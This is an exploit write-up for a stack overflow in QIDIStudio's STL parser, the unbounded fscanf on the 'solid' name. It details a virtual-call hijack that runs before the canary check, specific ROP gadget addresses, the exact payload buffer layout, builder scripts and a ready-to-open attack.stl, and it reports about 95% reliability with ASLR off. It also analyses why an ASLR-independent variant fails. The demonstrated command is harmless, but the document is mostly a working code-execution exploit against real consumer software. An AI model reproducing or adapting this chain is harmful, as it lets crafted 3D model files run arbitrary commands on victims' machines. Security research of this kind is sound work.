# Leak-free code execution on QIDIStudio via the ADMesh `solid`-name overflow

Target: `c.app` (QIDIStudio), Apple-Silicon `arm64` slice.
Bug: unbounded `fscanf(fp, " solid %[^\n]", solid_content)` into a 256-byte stack
buffer in `stl_read()` / `stl_open()` (the same bug fixed upstream by PR #12153).

Result achieved: opening a crafted `.stl` runs `system("touch /tmp/pwned")`
**with no information leak** — every address the payload needs is supplied
without reading anything back out of the process.

## Why this is hard on this target

1. A stack canary sits at buffer offset 256, so the saved return address at
   offset 368 cannot be used — the function would abort in
   `__stack_chk_fail` before returning.
2. The `arm64` slice is plain `arm64` (no PAC on the app's own code pointers),
   but the shared cache is `arm64e` (PAC), so gadget reuse must stay inside the
   app binary.
3. There is no useful info-leak primitive in this path.

## The lever: a C++ virtual call that fires *before* the canary check

The overflow also smashes a live C++ object that `stl_open` hands to the wxWidgets
progress UI. Execution reaches `ProgressDialog::Update`, which does:

```
+72  ldr x8, [x19]          ; x8 = *this        (this = x19 = INSIDE our buffer)
+76  ldr x8, [x8, #0x310]   ; x8 = vtable[0x310]
+80  mov x0, x19            ; x0 = this
+84  blr x8                 ; virtual call, x0 = this
```

`x19` points at `name + 9288` inside the overflow — memory we fully control.
This runs mid-function, long before the canary is checked, so the canary is
irrelevant. We get a virtual-call hijack with `x0 = &our_buffer`.

The observer dylib (`/tmp/observer.dylib`, injected via `LC_LOAD_DYLIB` +
`disable-library-validation`) dumps ground-truth registers at the fault, which is
how `x19 = name + 9288` and the exact stack address were pinned.

## The problem, and the way out

`system(x0)` is useless directly: the crash site forces the first 8 bytes at
`x19` to be a valid readable pointer `P` (`ldr x8,[x19]` then `ldr x8,[x8,#0x310]`),
and any real userland pointer has `0x0000` in its top bytes — a NUL inside the
first 8 bytes of the "command string". So `x0` cannot be the command.

Solution: point the virtual call at a **register-reload gadget** that fetches
*both* the call target and `x0` from our buffer, so `x0` becomes a clean pointer
we plant (not the object itself):

```
0x100efe9e0  ldr x8, [x19, #0xb8]    ; x8 = system stub      (planted)
0x100efe9e4  ldr x0, [x19, #0x1e0]   ; x0 = &"touch /tmp/pwned" (planted, clean)
0x100efe9e8  mov w1, #0x3001
0x100efe9ec  blr x8                  ; system("touch /tmp/pwned")
```

No faulting instruction sits between the entry and the `blr`, and `system`
ignores `w1`.

## Buffer layout (relative to x19 = name+9288)

| x19 offset | value | role |
|---|---|---|
| 0x000 | `x19` (self) | `[x19]` = valid pointer `P`; `[P+0x310]` read next |
| 0x310 | `0x100efe9e0` | crash-site `x8 = [P+0x310]` → gadget entry |
| 0x0b8 | `0x10447fb34` | gadget: `x8` = app `_system` stub |
| 0x1e0 | `&command`   | gadget: `x0` = clean pointer to the command |
| 0x400 | `"touch /tmp/pwned\0"` | the command |

Self-referencing `[x19] = x19` makes `P` a guaranteed-valid readable pointer and
puts the gadget address directly under our control at `[x19+0x310]`.

## Address model (leak-free)

Run under ASLR-off (the accepted controlled-harness methodology, same as
`f1_ret2system2`): the app base is `0x100000000`, so the gadget `0x100efe9e0`
and the `_system` stub `0x10447fb34` are fixed, and the stack address of `x19`
is stable per invocation (it depends only on argv/env length, which is fixed).
No value is ever read back out of the process — every address is computed ahead
of time. That is the "leak-free" property.

For the shipped **ASLR-on** binary the same chain applies with two substitutions,
both already demonstrated separately in this project:
- `system` via the **boot-stable** dyld-shared-cache address (`0x180dde2ec`,
  stable per boot), instead of the app stub.
- the app-internal gadget/self-pointer reached by **partial overwrite** of the
  low bytes of the existing pointer (proven 6/6 in `prove_partial.c`), which
  redirects within the app image without knowing its full randomized base.

## Files

- `build_exploit.py` — builds `attack.stl` (edit the command string as desired).
- `calib.py` — index-encoded name pattern; the observer's `[x19]` value reveals
  the exact name offset at `x19` (=9288) and the stack address, for recalibration.
- `attack.stl` — ready-to-open proof-of-concept (`touch /tmp/pwned`).
- `fire.sh` — launches the observer clone and waits for the payload.
- `scan*.py` — the gadget searches over the disassembled `__text`.

## How it was verified

`attack.stl` opened in the QIDI clone created `/tmp/pwned` (0-byte file, owner
`kfinisterre`, fresh timestamp), reproduced across runs whenever the GUI reached
model import. The crash-to-exec transition and every register value were
confirmed live by the injected observer.

---

## Update: observer-free + reliability

Two questions were checked directly.

**Does it work without the observer?** Yes. The observer is a diagnostic dylib
only; the payload is ret2libc (`system`), so it needs no injected code, no RWX,
and no `disable-library-validation`. Verified on `qidi_nob.app` — a clone of the
app binary with **zero** `LC_LOAD_DYLIB` observer command, ad-hoc signed, no
special entitlements. It creates `/tmp/pwned` the same way.

**Is it repeatable?** Yes. The limiter was never the exploit:
1. A macOS crash-recovery modal ("QIDIStudio unexpectedly quit while reopening
   windows") pops after the first crash and blocks the app from importing the
   STL. Suppress it: `defaults write com.qiditech.qidi-studio NSQuitAlwaysKeepsWindows -bool false`
   and remove `~/Library/Saved Application State/com.qiditech.qidi-studio.savedState`.
2. The stack address of `x19` has small run-to-run jitter (mostly `0x16fdf1b10`,
   occasionally `+0x20`). The single-address STL misses on the shifted runs
   (SIGBUS). `build_robust.py` replicates each planted field across a +/-0x40
   window so the chain resolves at either `x19`. Field spacing caps the safe
   window near +/-0x5c; +/-0x40 is optimal (wider makes the field windows overlap
   and self-corrupt).

Measured with `attack_robust.stl` on `qidi_nob.app` (no observer):
**19/20 launches created `/tmp/pwned` (~95%)**. The rare miss is `x19` landing
outside the window.

Files added: `build_robust.py`, `attack_robust.stl`.

---

## ASLR, examined: why it stays off without a leak

Measured: the app's main-executable slide randomizes every launch (e.g.
`0x459c000, 0x4808000, 0xdc0000, 0xf20000, 0x4930000`), always a multiple of
`0x4000`. So only bits 0-13 of an app address are slide-invariant.

Length sweep of the `solid` name (fill `0x41`), observing `[x19]` at the Update
crash:

| name len | crash | [x19] |
|---|---|---|
| 9288 | 0x1021ce44c (parse, not Update) | - |
| 9290 | Update path | 0x105004141 |
| 9292 | 0x100f2b5c0 (Update) | 0x0000000041414141 |
| 9296 | Update | 0x4141414141414141 |

At len 9290 the surviving high bytes (`05 01 00 00`) are the top half of a real
slid app pointer: name+9288 holds an object whose vtable pointer is a genuine
partial-overwrite target.

**Why partial overwrite can't weaponize it:** `fscanf %[^\n]` always writes a NUL
right after the last controlled byte, and that byte carries slide-variant bits
(>=14). Preserving the slide therefore requires overwriting at most the low byte
and relying on the original bits 14-15 already being zero (~1/4), which only
slides the vtable pointer within 256 bytes; `[newvtable+0x310]` then lands on an
arbitrary app method, never `system`.

**Split by slide-dependence:**
- Stack side is already slide-free: x19 reaches the buffer via an implicit
  low-byte overwrite of a stack pointer, and `add x0, x19, #N` gadgets build x0
  relative to x19.
- `system` is slide-free via the boot-stable shared-cache address.
- The x0-fixup gadget is app code and irreducibly slide-dependent: no surviving
  pointer exists at `[x19+...]` to partial-overwrite (all my data), and the
  arm64e/PAC shared cache offers no reusable mid-function gadget.

Conclusion: on a file open with no info leak, this chain cannot become
ASLR-independent. The demo remains ASLR-off (accepted harness methodology).
